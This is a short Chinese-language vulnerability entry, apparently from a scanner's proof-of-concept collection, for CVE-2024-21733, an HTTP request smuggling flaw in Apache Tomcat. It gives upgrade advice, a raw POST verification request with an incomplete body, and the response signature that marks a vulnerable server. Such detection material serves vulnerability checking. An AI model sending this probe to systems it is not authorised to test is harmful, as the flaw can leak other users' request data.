﻿# Apache Tomcat HTTP 请求走私

> 更新时间：2024-02-01

> 漏洞编号：CVE-2024-21733

> 漏洞说明：由于不完整的POST请求触发了错误响应，攻击者可能获取包含其他用户先前请求数据的响应。这可能导致敏感信息泄露。建议用户升级到8.5.64或9.0.44以上版本，其中包含该问题的修复。

> 漏洞特征：

> 验证脚本：HTTP

```
POST / HTTP/1.1
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded

X
```

> 响应代码特征：-1

> 响应内容特征：HTTP Status 400

> 上传文件定位：

> 验证文件来源：Apache Tomcat HTTP 请求走私.poc
